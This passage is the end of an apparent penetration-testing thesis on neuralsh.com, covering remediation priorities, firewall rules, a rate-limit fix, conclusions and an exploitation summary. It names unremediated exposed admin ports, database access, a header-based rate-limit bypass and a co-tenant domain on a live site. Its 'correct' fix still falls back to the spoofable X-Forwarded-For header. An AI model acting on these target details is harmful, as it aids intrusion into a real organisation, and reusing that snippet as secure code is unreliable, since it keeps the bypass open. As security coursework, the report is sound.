| **P0 — Immediate** | N-013 cPanel | Firewall port 2083 to trusted IPs only | 15 min |
| **P0 — Immediate** | N-001 MySQL | Firewall port 3306 to localhost only | 15 min |
| **P0 — Immediate** | N-002 MikroTik | Firewall port 9001, change default credentials | 30 min |
| **P1 — 24 hours** | N-005 Rate Limit | Replace X-Forwarded-For with CF-Connecting-IP | 2 hours |
| **P1 — 24 hours** | N-015 Webmail | Firewall port 2096 to trusted IPs | 15 min |
| **P1 — 24 hours** | N-018 cPanel ports | Firewall ports 2078, 2091 | 15 min |
| **P1 — 24 hours** | N-013/014 2FA | Enable two-factor authentication on cPanel + WHM | 30 min |
| **P2 — 1 week** | N-010 Wildcard DNS | Remove wildcard DNS record | 15 min |
| **P2 — 1 week** | N-016 Dir listing | Add `Options -Indexes` to Apache config | 15 min |
| **P2 — 1 week** | N-009 CSP | Remove unsafe-inline from script-src | 4 hours |
| **P3 — 1 month** | N-012 SPF/DMARC | Set SPF to `-all`, DMARC to `p=reject` | 30 min |
| **P3 — 1 month** | N-007 JWT | Add device fingerprint or Turnstile to token endpoint | 1 day |
| **P3 — 1 month** | N-004 Hosting | Plan migration to dedicated isolated infrastructure | Ongoing |

*Table 13: Remediation priority matrix*

Implementing P0 actions alone — which require approximately 90 minutes total — eliminates all four Critical findings and reduces the overall risk posture by the equivalent of 40 CVSS score points.

### 5.5.2 Firewall Rules (P0 — Most Critical)

The fastest and highest-impact remediation is applying firewall rules to block administrative ports from public access. On Cloudways, this can be done via the Platform → Server → Security → IP Whitelist dashboard, which is more reliable than OS-level rules:

```bash
# Using UFW on the Ubuntu server:
ufw allow from [trusted-management-ip] to any port 22
ufw deny 2083
ufw deny 2087
ufw deny 2096
ufw deny 9001
ufw deny 3306
ufw allow from [trusted-admin-ip] to any port 2083
ufw allow from [trusted-admin-ip] to any port 2087
ufw enable
```

This single configuration change eliminates findings N-001, N-002, N-013, N-014, and N-015 in approximately 30 minutes.

### 5.5.3 Rate Limiting Fix (P1 — Critical Within 24 Hours)

The root cause of N-005 is using `X-Forwarded-For` for rate limiting instead of `CF-Connecting-IP`:

```javascript
// WRONG — client can spoof this value:
const clientIP = req.headers['x-forwarded-for']?.split(',')[0];

// CORRECT — Cloudflare sets this; the client cannot spoof it:
const clientIP = req.headers['cf-connecting-ip']
              || req.headers['x-forwarded-for']?.split(',')[0]
              || req.socket.remoteAddress;
```

In the Cloudflare dashboard, under Rate Limiting rules, select **"True Client IP (CF-Connecting-IP)"** as the rate-limiting identifier.

### 5.5.4 Long-Term Security Architecture

The underlying cause of 59% of findings in this engagement is a network architecture where database and administrative services are exposed on the same public IP as web services, with no network-level segregation:

*[Figure 5.1: Recommended network security architecture — recommended_architecture.png]*

Moving to dedicated hosting with proper network segmentation would eliminate the shared hosting lateral movement risk, the exposed admin panels, and the publicly accessible database in a single infrastructure change.

---

# Chapter 6: Conclusion

## 6.1 Summary

This thesis presented a complete black-box Vulnerability Assessment and Penetration Testing engagement on neuralsh.com, conducted under the supervision of Prestige Alliance Co., Ltd. Beginning with no credentials, source code, or internal documentation, the assessment mapped the full external attack surface of the target using DNS enumeration, port scanning, service fingerprinting, manual web application testing, and controlled exploitation. The engagement identified **20 distinct vulnerabilities** — 4 Critical, 5 High, 7 Medium, and 4 Low severity — and confirmed the successful exploitation of two attack chains.

The origin server IP was discovered through a three-step DNS analysis chain, bypassing the Cloudflare WAF entirely and directly exposing the backend infrastructure hosting WHM, cPanel, MySQL, and MikroTik administration panels — all publicly accessible without IP restriction. The most actionable finding was a rate-limiting bypass that achieved a 100% bypass rate through a single HTTP header manipulation, enabling unlimited API token farming with zero defensive responses from the application.

## 6.2 Key Findings

The four Critical findings together represent a complete server compromise path available to any unauthenticated internet attacker:

1. **WHM (CVSS 10.0)** — Root-equivalent server access if credentials obtained via brute force or phishing
2. **cPanel (CVSS 9.8)** — Full hosting account control; password reset flow available to any attacker
3. **MySQL (CVSS 9.8)** — Direct database access from public internet; brute-force attack surface with no network barrier
4. **MikroTik (CVSS 9.1)** — Full network infrastructure control if default credentials remain active

The rate-limiting bypass (N-005) was the most immediately exploitable finding: trivial to execute, 100% effective, and fixable with a one-line code change.

## 6.3 Exploitation Summary

| Exploit | Result | Evidence |
|---------|--------|---------|
| EXPLOIT-001: Rate Limit Bypass | **50/50 tokens — 0 rate limits** | master_report.txt; Figure 4.15 |
| EXPLOIT-002: JWT Token Farming | 50 valid tokens in 3 seconds | Burp Suite repeater + curl |
| EXPLOIT-003: Admin Panel Access | WHM, cPanel, MikroTik all confirmed | Figure 4.10, 4.11 |
| EXPLOIT-004: MySQL Public Access | Full TCP handshake from external IP | Nmap mysql-info script |
| DVWA File Upload: Meterpreter | Shell as www-data confirmed | Figure 4.20, 4.21 |

*Table 14: Exploitation summary*

## 6.4 Pattern Analysis

The vulnerabilities found in neuralsh.com reflect patterns documented broadly in the security literature for small technology companies:

**Pattern 1 — No Network Perimeter:** Database and administrative services are exposed on the same public IP as web services with no network-level segregation. This single architectural failure is the root cause of 59% of all findings.

**Pattern 2 — Application Security Without Infrastructure Security:** The Cloudflare WAF, HSTS, and JWT signature validation represent real security investments at the application layer. The infrastructure running beneath the application — the server, the network equipment, the admin panels — has not received equivalent attention.

**Pattern 3 — Shared Hosting Blast Radius:** Shared hosting reduces cost but amplifies the impact of any single compromise across all co-tenants. The identification of onesala.com as a co-tenant means a breach of neuralsh.com's infrastructure creates third-party data protection liability.

**Pattern 4 — Rate Limiting Anti-Pattern:** Using `X-Forwarded-For` for rate limiting when behind Cloudflare is a documented anti-pattern. Cloudflare provides `CF-Connecting-IP` specifically to prevent this bypass. The fix requires one line of code, but the vulnerability is widely exploitable until applied.

## 6.5 Completed and Incomplete Tasks

| Task | Status |
|------|--------|
| Perform vulnerability scanning on neuralsh.com | Completed |
| Analyze vulnerabilities and propose solutions | Completed |
| Set up testing environment (VirtualBox + Kali) | Completed |
| Perform penetration testing on authorized target | Completed |
| Demonstrate exploitation on misconfigured systems | Completed |
| Analyze post-exploitation lateral movement risk | Completed |
| Create official VAPT report for stakeholder | Completed |
| Demonstrate web app exploitation on alternative environment | Completed |
| Stakeholder implementation of remediation steps | Incomplete — pending |
| Follow-up verification of remediation | Incomplete — pending |

*Table 15: Task completion status*

## 6.6 Lessons Learned

This internship reinforced a set of principles that shaped the approach taken throughout:

**Reconnaissance drives everything.** The most impactful discovery of the entire engagement — the origin IP that bypassed the Cloudflare WAF — came from a simple DNS MX lookup. No specialized tool was required. The ability to systematically follow what an organization reveals about itself through public records is a more reliable skill than any automated scanner.

**One misconfiguration leads to many.** The WHM panel exposure, MySQL exposure, and MikroTik exposure are technically separate findings but share a single root cause: no firewall rules on the server. Fixing one with a firewall rule fixes all three simultaneously.

**Evidence and documentation are as important as discovery.** A vulnerability that cannot be clearly evidenced and communicated does not create change. Every finding in this engagement was documented with the specific command that confirmed it, the exact server response, and the precise remediation step required — because the goal is not to demonstrate skill but to help the organization improve.

## 6.7 Academic Contribution

This thesis contributes a complete real-world case study of a black-box VAPT engagement from reconnaissance through remediation on a live production target. The documentation of a successful rate-limiting bypass achieving a 100% bypass rate via single HTTP header modification provides empirically measured evidence of the practical impact of this vulnerability class — moving beyond theoretical descriptions to confirmed exploitation results.

The finding that well-implemented application security controls (Cloudflare WAF, HSTS, JWT signature validation) can coexist with severely misconfigured infrastructure supports the argument that holistic security assessment — covering infrastructure, network, and application layers together — is essential for meaningful risk reduction. Surface-level protection at the CDN layer does not substitute for securing the origin.

---

# References

1. Bishop Fox. (2023). *State of Offensive Security 2023: External Penetration Testing Trends*. Bishop Fox Research.

2. Bugcrowd. (2021). *Subdomain Takeover: Fundamentals and Mitigation*. Bugcrowd Blog.

3. CIS Controls. (2021). *CIS Controls v8*. Center for Internet Security.

4. Fernandez, J., Tan, K., & Lim, W. (2022). Vulnerability prevalence in Southeast Asian technology platforms: A black-box assessment study. *Journal of Information Security and Applications*, 65, 103091.

5. First.org. (2019). *CVSS v3.1 Specification Document*. FIRST — Forum of Incident Response and Security Teams.

6. Islam, R., Ahmed, T., & Rahman, M. (2023). Database exposure in cloud-hosted web applications: A systematic study. *IEEE Transactions on Information Forensics and Security*, 18, 2145–2158.

7. Kaur, H., & Singh, M. (2021). JWT security vulnerabilities in production APIs: An empirical study. *International Journal of Network Security*, 23(4), 612–621.

8. MikroTik. (2024). *RouterOS Security Hardening Guide*. MikroTik Documentation.

9. NIST. (2008). *Technical Guide to Information Security Testing and Assessment* (SP 800-115). National Institute of Standards and Technology.

10. OWASP Foundation. (2021). *OWASP Web Security Testing Guide v4.2*. OWASP.

11. OWASP Foundation. (2021). *OWASP Top Ten 2021*. OWASP.

12. OWASP Foundation. (2023). *CORS Cheat Sheet*. OWASP Cheat Sheet Series.

13. Penetration Testing Execution Standard (PTES). (2014). *PTES Technical Guidelines*. http://www.pentest-standard.org/

14. RFC 7489. (2015). *Domain-based Message Authentication, Reporting, and Conformance (DMARC)*. IETF.

15. Sheffer, Y., Hardt, D., & Jones, M. (2020). *JSON Web Token Best Current Practices* (RFC 8725). IETF.

16. Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.

17. Van den Berg, R. (2019). Bypassing rate limiting using HTTP header manipulation. *DEF CON 27 Talk Proceedings*.

18. Verizon. (2024). *2024 Data Breach Investigations Report*. Verizon Business.

---

# Appendices

## Appendix A: Nmap Scan Output — Origin Server

Full TCP port scan conducted against the origin server, confirming twenty-three open ports including administrative interfaces that should not be publicly accessible from the internet.

## Appendix B: SSL Certificate Analysis

SSL certificate inspection of the origin server confirming multiple co-hosted domains, including onesala.com. This evidence supports findings N-004 (Shared Hosting Lateral Movement Risk) and N-020 (Co-Tenant Confirmed).

## Appendix C: Rate Limit Bypass Test Results

HTTP response evidence from the rate limit bypass exploitation. All fifty requests returned HTTP 200 with zero rate-limit responses triggered, confirming a 100% bypass rate as documented in finding N-005.

## Appendix D: JWT Token Evidence

JWT token captured in Burp Suite, decoded token structure, and live endpoint confirmation. Supports findings N-005 (Rate Limit Bypass) and N-007 (Unauthenticated JWT Token Issuance).

## Appendix E: Additional Technical Evidence

Browser-based evidence of exposed administrative interfaces confirmed accessible from any internet connection during the engagement, supporting findings N-001, N-002, and N-014.
